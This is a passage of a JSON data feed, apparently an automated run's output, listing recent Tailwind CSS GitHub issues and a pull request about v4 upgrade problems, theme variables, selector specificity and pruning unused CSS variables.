\"^3.4.2\",  \"vite\": \"^6.0.5\"\n\n**What version of Node.js are you using?**\n\nFor example: v22.13.1\n\n**What browser are you using?**\n\nFor example: Chrome\n\n**What operating system are you using?**\n\nFor example: Windows 11\n\nplease solve this warning and ruls\n![Image](https://github.com/user-attachments/assets/6a3f9398-bbc7-445d-808b-879fbbdafc0e)","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16230","RelatedDescription":"Closed issue \"es lint warn for Property is ignored due to the display. With 'display: block' , vertical-align should not be used.\" (#16230)"},{"Id":"2828375336","IsPullRequest":false,"CreatedAt":"2025-02-03T19:46:29","Actor":"oom-","Number":"16219","RawContent":null,"Title":"[v4] Cannot use theme color in gradient","State":"closed","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\n`\"tailwindcss\": \"^4.0.3\",`\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\n`\"nuxt\": \"^3.15.4\"`\n\n**What version of Node.js are you using?**\n\n`v20.18.2`\n\n**What browser are you using?**\n\nChrome\n\n**What operating system are you using?**\n\nWindows\n\n**Reproduction URL**\n[https://play.tailwindcss.com/8kRusJVCGo](https://play.tailwindcss.com/8kRusJVCGo)\n\n\n**Describe your issue**\nGradient are not working with theme custom color: \n```css\n@import \"tailwindcss\";\n\n@theme {\n    --color-my-start: \"#ff0000\";\n    --color-my-end: \"#0000ff\";\n}\n```\n\n`bg-gradient-to-r from-my-start to-my-end` not working (see reproduction link)\n\nGetting this error in the inspector on my project:\n![Image](https://github.com/user-attachments/assets/53a240a3-ca65-4fcc-8996-8ee28fe46389)","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16219","RelatedDescription":"Closed issue \"[v4] Cannot use theme color in gradient\" (#16219)"},{"Id":"2828036795","IsPullRequest":false,"CreatedAt":"2025-02-03T16:51:47","Actor":"mikeE-finsight","Number":"16214","RawContent":null,"Title":"Group selector specificity breaks v3 => v4 upgrade for hover","State":"open","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\nv4.0.2\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\nNext.js 15.1.3\n\n**What version of Node.js are you using?**\n\nv22.12.0\n\n**What browser are you using?**\n\nChrome\n\n**What operating system are you using?**\n\nmacOS\n\n**Reproduction URL**\nhttps://play.tailwindcss.com/xDLYpPt75s\n\n**Describe your issue**\n\nUpgrading from v3 => v4 breaks the specificity for `group` with `invalid` and `hover` classes.\n\nFrom the repro:\n\n```html\n<form class=\"group p-5\" action=\"\">\n  <input class=\"border border-black\" type=\"text\" required />\n  <button class=\"bg-indigo-400 p-1 group-invalid:bg-red-400 hover:bg-amber-200\">hover me in v3 and then v4</button>\n\n  <!-- This fixes it by explicitly overriding the invalid hover which is not ideal -->\n  <button class=\"bg-indigo-400 p-1 group-invalid:bg-red-400 hover:bg-amber-200 group-invalid:hover:bg-red-400\">fixed in v4: added explicit hover</button>\n</form>\n```\n\nv3 CSS produces:\n\n```css\n.hover\\:bg-amber-200:hover {\n  --tw-bg-opacity: 1;\n  background-color: rgb(253 230 138 / var(--tw-bg-opacity, 1));\n}\n\n.group:invalid .group-invalid\\:bg-red-400 {\n  --tw-bg-opacity: 1;\n  background-color: rgb(248 113 113 / var(--tw-bg-opacity, 1));\n}\n```\n\nv4 CSS produces:\n\n```css\n.group-invalid\\:bg-red-400 {\n    &:is(:where(.group):invalid *) {\n      background-color: var(--color-red-400);\n    }\n  }\n\n  .hover\\:bg-amber-200 {\n    &:hover {\n      @media (hover: hover) {\n        background-color: var(--color-amber-200);\n      }\n    }\n  }\n```\n\nI would expect the classes to still be something like `.group:invalid .group-invalid\\:bg-red-400` in v4 because that would maintain specificity between versions.\n\nWhat I tried:\n\n1. Tried to revert using the hover using `@custom-variant hover (&:hover);`. This still doesn't work because of specificity issues.\n\nThe fix:\n\n1. Add `group-invalid:hover:bg-red-400` which is pretty clunky and not intuitive\n2. Add `! important` (not ideal)\n\n**Desired Outcome**\n\nCan we add something to the [Upgrade Guide](https://tailwindcss.com/docs/upgrade-guide#hover-styles-on-mobile)? I'm happy to put up a PR for that but I want to verify if this is intended behavior first.\n\nThanks!","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16214","RelatedDescription":"Open issue \"Group selector specificity breaks v3 => v4 upgrade for hover\" (#16214)"},{"Id":"2827612259","IsPullRequest":false,"CreatedAt":"2025-02-03T16:29:34","Actor":"vdegenne","Number":"16208","RawContent":null,"Title":"base layer messing with custom elements","State":"closed","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\n^4.0.3\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\njust `tailwindcss` and native html features.\n\n**What version of Node.js are you using?**\n\nv23.4.0\n\n**What browser are you using?**\n\nChrome\n\n**What operating system are you using?**\n\nFedora 41\n\n**Describe your issue**\n\nI've talked about that before in this [issue](https://github.com/tailwindlabs/tailwindcss/issues/15799#event-16110739542). When applying a stylesheet transformed by `tailwindcss` to a custom element the styles were not applied to the custom element because it was not using the `:host` namespace.\n\nSimilarly now, the base layer is widely spread into the custom elements which breaks all the private styles:\n\n![Image](https://github.com/user-attachments/assets/852f8c4c-c99b-4282-a966-140f249004b0)\n\nOne solution would be to enclose the base layer styles into `:root`.","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16208","RelatedDescription":"Closed issue \"base layer messing with custom elements\" (#16208)"},{"Id":"2827841200","IsPullRequest":true,"CreatedAt":"2025-02-03T15:29:41","Actor":"RobinMalfait","Number":"16211","RawContent":null,"Title":"Only expose used CSS variables","State":"open","Body":"This PR only exposes used CSS variables. \r\n\r\nMy initial approach was to track the used variables, this was a bit messy because it meant that we had to walk part of the AST(s) in multiple places. We also had to be careful because sometimes if a variable exists in an AST, that doesn't mean that it's actually used. E.g.:\r\n\r\n```css\r\nh1 {\r\n  color: var(--color-red-500); /* Definitely used, so let's keep it */\r\n}\r\n\r\n@utility foo {\r\n  color: var(--color-blue-500); /* Hmm, used? */\r\n}\r\n```\r\nIn this last case, the `--color-blue-500` is part of the CSS AST, but as long as `foo` the utility is not used, it won't end up in your actual CSS file, therefore the variable is **not** used.\r\n\r\nAlternatively, if the `foo` utility is used with an invalid variant (e.g.: `group-[>.foo]:foo`, then the `@utility foo` code will still run internally because variants are applied on top of the utility. This means that it looks like `var(--color-blue-500)` is being used.\r\n\r\nAnother annoying side effect was that because variables are conditionally generated, that the `@theme` -> `:root, :host` conversion had to happen for every build, instead of once in the `compile(‚Ä¶)` step.\r\n\r\n---\r\n\r\nTo prevent all the messy rules and additional booking while walking of ASTs I thought about a different approach. We are only interested in variables that are actually used. The only way we know for sure, is right before the `toCss(‚Ä¶)` step. Any step before that could still throw away AST nodes.\r\n\r\nHowever, we do have an `optimizeAst` step right before printing to simplify and optimize the AST. So the idea was to keep all the CSS variables in the AST, and only in the `optimizeAst` step we perform a kind of mark-and-sweep algorithm where we can first check which variables are _actually_ used (these are the ones that are left in the AST), and later we removed the ones that weren't part of known used list.\r\n\r\nMoving the logic to this step feels a natural spot for this to happen, because we are in fact optimizing the AST. We were already walking the AST, so we can just handle these cases while we are walking without additional walks. Last but not least, this also means that there is only a single spot where need to track and remove variables.\r\n\r\nNow, there is a different part to this story. If you use a variable in JS land for example, we also want to make sure that we keep the CSS variable in the CSS. To do this, we can mark variables as being used in the internal `Theme`.\r\n\r\nThe Oxide scanner will also emit used variables that it can find such as `var(--color-red-500)` and will emit `--color-red-500` as a \"candidate\". We can then proactively mark this one as used even though it may not be used anyway in the actual AST.","Url":"https://github.com/tailwindlabs/tailwindcss/pull/16211","RelatedDescription":"Open PR \"Only expose used CSS variables\" (#16211)"},{"Id":"2827794215","IsPullRequest":false,"CreatedAt":"2025-02-03T15:11:21","Actor":"kachkaev","Number":"16209","RawContent":null,"Title":"Types from `tailwindcss/types/config` are not available in v4","State":"open","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\nv4.0.3\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\ntypescript 5.7.3, any framework\n\n**What version of Node.js are you using?**\n\nv22.13.1\n\n**What browser are you using?**\n\nN/A\n\n**What operating system are you using?**\n\nN/A\n\n**Reproduction URL**\n\nhttps://github.com/kachkaev/tailwind-v4-typings/pull/1\n\n‚Üë See `tsc` failure in CI (it passes on `main` for TailwindCSS v3)\n\n**Describe your issue**\n\nI am trying to upgrade a project from TailwindCSS v3 to v4. There is a custom `tailwind.config.ts` which is quite hard to migrate to a CSS file, at least in one go. I would like to keep using `tailwind.config.ts` but have trouble with this because of typings. This import path is no longer available:\n\n```ts\nimport type { PluginAPI, ThemeConfig } from \"tailwindcss/types/config\";\n```\n\nI understand that CSS config is preferred over the TS one, just looking for a practical way to upgrade. It‚Äôd be great to keep `tailwindcss/types/config` (or alike) available in v4. Typings can be removed in v5 if there is a plan to drop TS configs completely.","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16209","RelatedDescription":"Open issue \"Types from `tailwindcss/types/config` are not available in v4\" (#16209)"},{"Id":"2827406942","IsPullRequest":false,"CreatedAt":"2025-02-03T12:53:41","Actor":"Yang-Yus","Number":"16205","RawContent":null,"Title":"media query not work properly with theme variables","State":"closed","Body":"<!-- Please provide all of the information requested below. We're a small team and without all of this information it's not possible for us to help and your bug report will be closed. -->\n\n**What version of Tailwind CSS are you using?**\n\n4.0.3\n\n**What build tool (or framework if it abstracts the build tool) are you using?**\n\nVite\n\n**What version of Node.js are you using?**\n\n20.12.2\n\n**What browser are you using?**\n\nChrome\n\n**What operating system are you using?**\n\nmacOS\n\n**Reproduction URL**\n\nhttps://play.tailwindcss.com/aYjkwS7Og5\n\n**Describe your issue**\n\n```\n@theme {\n  --color-rose-500: #FFC8EF;\n  --breakpoint-sm: 40rem;\n}\n\n /* min-width: var(--breakpoint-sm) NOT WORKING */\n .container{\n  @media all and (min-width: var(--breakpoint-sm)) {\n    padding-left: 100px;\n    padding-right: 100px;\n  }\n}\n```","Url":"https://github.com/tailwindlabs/tailwindcss/issues/16205","RelatedDescription":"Closed issue \"media query not work properly with theme variables\" (#16205)"}],"ResultType":"GitHubIssue"}},"RunOn":"2025-02-05T03:30:25.562598Z","RunDurationInMilliseconds":520}